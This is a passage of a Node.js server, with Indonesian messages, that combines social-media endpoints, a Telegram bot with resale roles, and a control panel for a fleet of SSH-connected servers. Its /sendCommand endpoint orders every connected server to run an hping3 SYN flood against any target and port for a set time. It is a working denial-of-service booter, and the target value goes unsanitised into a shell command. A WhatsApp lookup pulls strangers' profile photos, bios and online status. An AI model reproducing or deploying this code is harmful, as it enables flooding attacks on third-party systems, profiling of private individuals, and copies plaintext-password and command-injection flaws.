    const withUser = req.params.withUser;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    const username = keyInfo.username;
    const limitNum = parseInt(limit) || 100;
    const messages = chatList
        .filter(m => (m.from === username && m.to === withUser) || (m.from === withUser && m.to === username))
        .slice(-limitNum)
        .map(m => ({
            id: m.id,
            sender: m.from,
            receiver: m.to,
            message: m.message,
            replyTo: m.replyTo || null,
            fromMe: m.from === username,
            read: m.read || false,
            timestamp: m.timestamp
        }));
    res.json({ valid: true, messages });
});

app.post('/chat/private/send/:withUser', (req, res) => {
    const { key } = req.query;
    const withUser = req.params.withUser;
    const { message, replyTo } = req.body;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    if (!message || message.trim() === '') return res.json({ valid: false, message: 'Message empty' });
    
    const chat = {
        id: Date.now().toString(),
        from: keyInfo.username,
        to: withUser,
        message: message.trim(),
        replyTo: replyTo || null,
        timestamp: new Date().toISOString(),
        created_at: new Date().toISOString(),
        read: false
    };
    chatList.push(chat);
    saveChat();
    
    const payload = JSON.stringify({
        type: 'private_message',
        message: chat
    });
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.username) {
            if (client.username === keyInfo.username || client.username === withUser) {
                client.send(payload);
            }
        }
    });
    
    res.json({ valid: true, status: 'sent' });
});

app.post('/chat/private/mark-read/:withUser', (req, res) => {
    const { key } = req.query;
    const withUser = req.params.withUser;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    const username = keyInfo.username;
    chatList.forEach(m => {
        if (m.from === withUser && m.to === username && m.read === false) {
            m.read = true;
        }
    });
    saveChat();
    res.json({ valid: true });
});

app.get('/chat/search-users', (req, res) => {
    const { key, q } = req.query;
    const keyInfo = activeKeys[key];
    if (!keyInfo) return res.json({ valid: false, message: 'Invalid key' });
    const query = q ? q.trim().toLowerCase() : '';
    if (query.length < 2) return res.json({ valid: true, users: [] });
    const db = loadDatabaseCached();
    const users = db.users
        .filter(u => u.username.toLowerCase().includes(query))
        .map(u => ({
            username: u.username,
            profile: {
                username: u.username,
                name: u.username,
                role: u.role || 'full up'
            },
            role: u.role || 'full up'
        }));
    res.json({ valid: true, users });
});

// ─── API ENDPOINTS SOSIAL MEDIA ──────────────────────────────────

// GET ALL POSTS
app.get('/api/posts', (req, res) => {
  try {
    const db = loadDatabaseCached();
    const posts = db.posts
      .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
      .map(post => ({
        ...post,
        likes: post.likes?.length || 0,
        comments: post.comments || []
      }));
    res.json(posts);
  } catch (error) {
    console.error('[API] Error fetching posts:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// GET POSTS BY USER
app.get('/api/posts/user/:userId', (req, res) => {
  try {
    const userId = req.params.userId;
    const db = loadDatabaseCached();
    const posts = db.posts
      .filter(p => p.userId === userId || p.username === userId)
      .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
    res.json(posts);
  } catch (error) {
    console.error('[API] User posts error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// GET POST DETAIL
app.get('/api/posts/:postId', (req, res) => {
  try {
    const postId = req.params.postId;
    const db = loadDatabaseCached();
    const post = db.posts.find(p => p.id === postId);
    if (!post) {
      return res.status(404).json({ error: 'Post not found' });
    }
    res.json(post);
  } catch (error) {
    console.error('[API] Post detail error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// GET ALL USERS
app.get('/api/users', (req, res) => {
  try {
    const db = loadDatabaseCached();
    const users = db.users.map(({ password, ...user }) => user);
    res.json(users);
  } catch (error) {
    console.error('[API] Error fetching users:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// GET USER BY ID
app.get('/api/user/:userId', (req, res) => {
  try {
    const userId = req.params.userId;
    const db = loadDatabaseCached();
    const user = db.users.find(u => u.id === userId || u.username === userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    const { password, ...safeUser } = user;
    res.json(safeUser);
  } catch (error) {
    console.error('[API] User detail error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// SEARCH USERS
app.get('/api/search/:query', (req, res) => {
  try {
    const query = req.params.query?.toLowerCase().trim() || '';
    if (query.length < 2) {
      return res.json([]);
    }
    const db = loadDatabaseCached();
    const results = db.users
      .filter(u => 
        u.username.toLowerCase().includes(query) || 
        (u.name && u.name.toLowerCase().includes(query))
      )
      .map(({ password, ...user }) => user)
      .slice(0, 20);
    res.json(results);
  } catch (error) {
    console.error('[API] Search error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// GET FOLLOWERS
app.get('/api/followers/:userId', (req, res) => {
  try {
    const userId = req.params.userId;
    const db = loadDatabaseCached();
    const user = db.users.find(u => u.id === userId || u.username === userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    const followers = db.users
      .filter(u => (user.followers || []).includes(u.id))
      .map(({ password, ...u }) => u);
    res.json(followers);
  } catch (error) {
    console.error('[API] Followers error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// GET FOLLOWING
app.get('/api/following/:userId', (req, res) => {
  try {
    const userId = req.params.userId;
    const db = loadDatabaseCached();
    const user = db.users.find(u => u.id === userId || u.username === userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    const following = db.users
      .filter(u => (user.following || []).includes(u.id))
      .map(({ password, ...u }) => u);
    res.json(following);
  } catch (error) {
    console.error('[API] Following error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// GET SUGGESTED USERS
app.get('/api/suggested/:userId', (req, res) => {
  try {
    const userId = req.params.userId;
    const db = loadDatabaseCached();
    const user = db.users.find(u => u.id === userId || u.username === userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    const suggested = db.users
      .filter(u => 
        u.id !== user.id && 
        !(user.following || []).includes(u.id)
      )
      .map(({ password, ...u }) => u)
      .slice(0, 10);
    res.json(suggested);
  } catch (error) {
    console.error('[API] Suggested error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// GET USER POSTS COUNT
app.get('/api/posts/count/:userId', (req, res) => {
  try {
    const userId = req.params.userId;
    const db = loadDatabaseCached();
    const count = db.posts.filter(p => p.userId === userId || p.username === userId).length;
    res.json({ count });
  } catch (error) {
    console.error('[API] Posts count error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── API ENDPOINTS (POST) ─────────────────────────────────────────

// FOLLOW/UNFOLLOW
app.post('/api/follow', async (req, res) => {
  try {
    const { userId, targetId } = req.body;
    
    if (!userId || !targetId) {
      return res.status(400).json({ error: 'userId and targetId required' });
    }
    
    if (userId === targetId) {
      return res.status(400).json({ error: 'Cannot follow yourself' });
    }

    const db = loadDatabase();
    const user = db.users.find(u => u.id === userId || u.username === userId);
    const target = db.users.find(u => u.id === targetId || u.username === targetId);
    
    if (!user || !target) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!user.following) user.following = [];
    if (!target.followers) target.followers = [];

    const isFollowing = user.following.includes(target.id);
    
    if (isFollowing) {
      user.following = user.following.filter(id => id !== target.id);
      target.followers = target.followers.filter(id => id !== user.id);
    } else {
      user.following.push(target.id);
      target.followers.push(user.id);
    }

    writeDatabase(db);
    
    res.json({
      success: true,
      isFollowing: !isFollowing,
      followingCount: user.following.length,
      followersCount: target.followers.length
    });
  } catch (error) {
    console.error('[API] Follow error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// LIKE/UNLIKE
app.post('/api/like', async (req, res) => {
  try {
    const { postId, userId } = req.body;
    
    if (!postId || !userId) {
      return res.status(400).json({ error: 'postId and userId required' });
    }

    const db = loadDatabase();
    const post = db.posts.find(p => p.id === postId);
    
    if (!post) {
      return res.status(404).json({ error: 'Post not found' });
    }

    if (!post.likes) post.likes = [];
    
    const isLiked = post.likes.includes(userId);
    
    if (isLiked) {
      post.likes = post.likes.filter(id => id !== userId);
    } else {
      post.likes.push(userId);
    }

    writeDatabase(db);
    
    res.json({
      success: true,
      isLiked: !isLiked,
      likes: post.likes.length
    });
  } catch (error) {
    console.error('[API] Like error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// COMMENT
app.post('/api/comment', async (req, res) => {
  try {
    const { postId, userId, text } = req.body;
    
    if (!postId || !userId || !text) {
      return res.status(400).json({ error: 'postId, userId, and text required' });
    }

    if (text.length > 500) {
      return res.status(400).json({ error: 'Comment too long (max 500 characters)' });
    }

    const db = loadDatabase();
    const post = db.posts.find(p => p.id === postId);
    const user = db.users.find(u => u.id === userId || u.username === userId);
    
    if (!post) {
      return res.status(404).json({ error: 'Post not found' });
    }
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (!post.comments) post.comments = [];

    const newComment = {
      userId: user.id,
      username: user.username,
      text: text.trim(),
      createdAt: new Date().toISOString()
    };

    post.comments.push(newComment);
    writeDatabase(db);
    
    res.json({
      success: true,
      comment: newComment
    });
  } catch (error) {
    console.error('[API] Comment error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── UPLOAD ENDPOINTS ─────────────────────────────────────────────

// UPLOAD VIDEO
app.post('/api/upload-video', socialUpload.single('video'), async (req, res) => {
  try {
    const { userId, caption } = req.body;
    
    if (!req.file) {
      return res.status(400).json({ error: 'No video uploaded' });
    }

    if (req.file.size > 100 * 1024 * 1024) {
      fs.unlinkSync(req.file.path);
      return res.status(400).json({ error: 'Video too large (max 100MB)' });
    }

    const db = loadDatabase();
    const user = db.users.find(u => u.id === userId || u.username === userId);
    
    if (!user) {
      fs.unlinkSync(req.file.path);
      return res.status(404).json({ error: 'User not found' });
    }

    const newPost = {
      id: `p${db.nextPostId || 1}`,
      userId: user.id,
      username: user.username,
      caption: caption || '',
      videoUrl: `/uploads/videos/${req.file.filename}`,
      thumbnail: null,
      createdAt: new Date().toISOString(),
      likes: [],
      comments: []
    };

    db.posts.unshift(newPost);
    db.nextPostId = (db.nextPostId || 1) + 1;
    writeDatabase(db);
    
    res.json({
      success: true,
      post: newPost
    });
  } catch (error) {
    console.error('[API] Upload video error:', error);
    if (req.file) {
      fs.unlinkSync(req.file.path);
    }
    res.status(500).json({ error: 'Internal server error' });
  }
});

// UPLOAD PROFILE PIC
app.post('/api/upload-pp', socialUpload.single('profilePic'), async (req, res) => {
  try {
    const { userId } = req.body;
    
    if (!req.file) {
      return res.status(400).json({ error: 'No image uploaded' });
    }

    const allowedTypes = ['image/jpeg', 'image/png', 'image/jpg', 'image/webp'];
    if (!allowedTypes.includes(req.file.mimetype)) {
      fs.unlinkSync(req.file.path);
      return res.status(400).json({ error: 'Invalid image type. Only JPEG, PNG, WEBP allowed' });
    }

    const db = loadDatabase();
    const user = db.users.find(u => u.id === userId || u.username === userId);
    
    if (!user) {
      fs.unlinkSync(req.file.path);
      return res.status(404).json({ error: 'User not found' });
    }

    if (user.profilePic) {
      const oldPath = path.join(__dirname, user.profilePic);
      if (fs.existsSync(oldPath)) {
        fs.unlinkSync(oldPath);
      }
    }

    user.profilePic = `/uploads/profiles/${req.file.filename}`;
    writeDatabase(db);
    
    res.json({
      success: true,
      profilePic: user.profilePic
    });
  } catch (error) {
    console.error('[API] Upload PP error:', error);
    if (req.file) {
      fs.unlinkSync(req.file.path);
    }
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── DELETE ENDPOINT ──────────────────────────────────────────────

// DELETE POST
app.delete('/api/posts/:postId', async (req, res) => {
  try {
    const { postId } = req.params;
    const { userId } = req.body;
    
    if (!userId) {
      return res.status(400).json({ error: 'userId required' });
    }

    const db = loadDatabase();
    const post = db.posts.find(p => p.id === postId);
    
    if (!post) {
      return res.status(404).json({ error: 'Post not found' });
    }

    const user = db.users.find(u => u.id === userId || u.username === userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }

    if (post.userId !== user.id) {
      return res.status(403).json({ error: 'Not your post' });
    }

    if (post.videoUrl) {
      const videoPath = path.join(__dirname, post.videoUrl);
      if (fs.existsSync(videoPath)) {
        fs.unlinkSync(videoPath);
      }
    }

    db.posts = db.posts.filter(p => p.id !== postId);
    writeDatabase(db);
    
    res.json({
      success: true,
      message: 'Post deleted successfully'
    });
  } catch (error) {
    console.error('[API] Delete post error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ========== COMMAND HANDLERS ==========
async function handleAddReseller(ctx) {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /addreseller ID_TELEGRAM</blockquote>`);
    }
    const targetId = parseInt(args[1]);
    if (isNaN(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
    }
    const config = loadTelegramConfig();
    const isReseller = config.resellerList && config.resellerList.includes(userId);
    const isVip = config.vipList && config.vipList.includes(userId);
    const isPt = config.ptList && config.ptList.includes(userId);
    const isOwner = config.ownerList && config.ownerList.includes(userId);
    const isDev = config.devList && config.devList.includes(userId);
    if (!isReseller && !isVip && !isPt && !isOwner && !isDev) {
        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
    }
    if (config.resellerList && config.resellerList.includes(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ User already has RESELLER role.</blockquote>`);
    }
    if (!config.resellerList) config.resellerList = [];
    config.resellerList.push(targetId);
    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: RESELLER</blockquote>`);
}

async function handleAddVip(ctx) {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /addvip ID_TELEGRAM</blockquote>`);
    }
    const targetId = parseInt(args[1]);
    if (isNaN(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
    }
    const config = loadTelegramConfig();
    const isVip = config.vipList && config.vipList.includes(userId);
    const isPt = config.ptList && config.ptList.includes(userId);
    const isOwner = config.ownerList && config.ownerList.includes(userId);
    const isDev = config.devList && config.devList.includes(userId);
    if (!isVip && !isPt && !isOwner && !isDev) {
        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
    }
    if (config.vipList && config.vipList.includes(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ User already has VIP role.</blockquote>`);
    }
    if (!config.vipList) config.vipList = [];
    config.vipList.push(targetId);
    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: VIP</blockquote>`);
}

async function handleAddPt(ctx) {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /addpt ID_TELEGRAM</blockquote>`);
    }
    const targetId = parseInt(args[1]);
    if (isNaN(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
    }
    const config = loadTelegramConfig();
    const isPt = config.ptList && config.ptList.includes(userId);
    const isOwner = config.ownerList && config.ownerList.includes(userId);
    const isDev = config.devList && config.devList.includes(userId);
    if (!isPt && !isOwner && !isDev) {
        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
    }
    if (config.ptList && config.ptList.includes(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ User already has PT role.</blockquote>`);
    }
    if (!config.ptList) config.ptList = [];
    config.ptList.push(targetId);
    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: PT</blockquote>`);
}

async function handleAddOwner(ctx) {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /addowner ID_TELEGRAM</blockquote>`);
    }
    const targetId = parseInt(args[1]);
    if (isNaN(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
    }
    const config = loadTelegramConfig();
    const isOwner = config.ownerList && config.ownerList.includes(userId);
    const isDev = config.devList && config.devList.includes(userId);
    if (!isOwner && !isDev) {
        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED\n\nHanya OWNER atau DEVELOPER yang bisa menambah Owner.</blockquote>`);
    }
    if (config.ownerList && config.ownerList.includes(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ User already has Owner role.</blockquote>`);
    }
    if (!config.ownerList) config.ownerList = [];
    config.ownerList.push(targetId);
    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: OWNER</blockquote>`);
}

async function handleAddDev(ctx) {
    const userId = ctx.from.id;
    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.replyWithHTML(`<blockquote>❌ Gunakan: /adddev ID_TELEGRAM</blockquote>`);
    }
    const targetId = parseInt(args[1]);
    if (isNaN(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ ID tidak valid!</blockquote>`);
    }
    const config = loadTelegramConfig();
    const isDev = config.devList && config.devList.includes(userId);
    if (!isDev) {
        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED\n\nHanya DEVELOPER yang bisa menambah Developer.</blockquote>`);
    }
    if (config.devList && config.devList.includes(targetId)) {
        return ctx.replyWithHTML(`<blockquote>❌ User already has Developer role.</blockquote>`);
    }
    if (!config.devList) config.devList = [];
    config.devList.push(targetId);
    fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
    await ctx.replyWithHTML(`<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: DEVELOPER</blockquote>`);
}

async function handleInfo(ctx) {
    const userId = ctx.from.id;
    const config = loadTelegramConfig();
    let role = "User";
    if (config.devList && config.devList.includes(userId)) role = "Developer";
    else if (config.ownerList && config.ownerList.includes(userId)) role = "Owner";
    else if (config.ptList && config.ptList.includes(userId)) role = "PT";
    else if (config.vipList && config.vipList.includes(userId)) role = "VIP";
    else if (config.resellerList && config.resellerList.includes(userId)) role = "Reseller";
    else if (config.fullupList && config.fullupList.includes(userId)) role = "Fullup";
    else if (config.userList && config.userList.includes(userId)) role = "User";

    const userInfo = `<blockquote>👤 Informasi User</blockquote>
<blockquote>📌 Nama: ${ctx.from.first_name || '-'}
🆔 ID: <code>${userId}</code>
🎯 Role: ${role}</blockquote>`;

    await ctx.replyWithHTML(userInfo);
}

async function handleClear(ctx) {
    const userId = ctx.from.id;
    const config = loadTelegramConfig();
    const isOwner = config.ownerList.includes(userId);
    const isDev = config.devList.includes(userId);

    if (!isOwner && !isDev) {
        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
    }

    try {
        if (!fs.existsSync(SESSION_PATH)) {
            return ctx.replyWithHTML(`<blockquote>⚠️ Folder 'permenmd' tidak ditemukan.</blockquote>`);
        }

        let deletedCount = 0;
        const userFolders = fs.readdirSync(SESSION_PATH);

        for (const userFolder of userFolders) {
            const userPath = path.join(SESSION_PATH, userFolder);
            if (!fs.lstatSync(userPath).isDirectory()) continue;

            const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
            if (!hasJson) {
                fs.rmSync(userPath, { recursive: true, force: true });
                deletedCount++;
            }
        }

        const responseMsg = deletedCount > 0 
            ? `🗑️ Berhasil hapus ${deletedCount} folder session kosong.`
            : `✨ Tidak ada folder session kosong.`;

        await ctx.replyWithHTML(`<blockquote>${responseMsg}</blockquote>`);
    } catch (err) {
        console.error("[ERROR] Cleanup failed:", err);
        await ctx.replyWithHTML(`<blockquote>❌ Gagal membersihkan folder.</blockquote>`);
    }
}

async function handleRestart(ctx) {
    const userId = ctx.from.id;
    const config = loadTelegramConfig();
    const isOwner = config.ownerList.includes(userId);
    const isDev = config.devList.includes(userId);

    if (!isOwner && !isDev) {
        return ctx.replyWithHTML(`<blockquote>❌ ACCESS DENIED</blockquote>`);
    }

    await ctx.replyWithHTML(`<blockquote>⚙️ SERVER REBOOT\n\nRestarting server...\nStatus: RESTARTING</blockquote>`);
    console.log("[SERVER] Manual restart triggered by Owner.");

    setTimeout(() => {
        process.exit(0);
    }, 2000);
}

// ========== ENDPOINT LAINNYA ==========
// FIX: PORT DIUBAH JADI 10552 SESUAI FOTO
const Domain = config.Domain;
const PORT = config.Port;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🟣 Server aktif di http://${Domain}:${PORT}`);
});

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000;

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

// ========== VPS CONNECTION ==========
function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

// ========== CHAT ENDPOINTS ==========
app.get("/api/chat/messages", (req, res) => {
  const { session_key } = req.query;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session key" });
  }
  
  const username = keyInfo.username;
  const userMessages = chatList.filter(m => 
    m.from === username || m.to === username
  );
  
  res.json(userMessages);
});

app.post("/api/chat/send", (req, res) => {
  const { session_key, username, role, message } = req.body;
  
  const keyInfo = activeKeys[session_key];
  if (!keyInfo) {
    return res.status(401).json({ valid: false, message: "Invalid session" });
  }
  
  if (keyInfo.username !== username) {
    return res.status(401).json({ valid: false, message: "Username mismatch" });
  }
  
  if (!message || message.trim() === "") {
    return res.status(400).json({ valid: false, message: "Message cannot be empty" });
  }
  
  const chat = {
    from: username,
    to: "public", 
    message: sanitize(message),
    role: role,
    time: new Date().toISOString(),
    created_at: new Date().toISOString()
  };
  
  chatList.push(chat);
  saveChat();
  
  for (const ws of Object.values(wsClients)) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({
        type: 'new_message',
        message: chat
      }));
    }
  }
  
  res.json({ valid: true, status: "sent", message: chat });
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = config.News;

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

// ========== ENDPOINT VALIDATE ==========
app.post("/validate", (req, res) => {
  console.log("[📥 VALIDATE] Request body:", req.body);

  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    console.log("[❌ VALIDATE] androidId missing");
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.users.find(u => u.username === username && u.password === password);

  if (!user) {
    console.log(`[❌ VALIDATE] User not found: ${username}`);
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log(`[⚠️ VALIDATE] User expired: ${username}`);
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);
      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

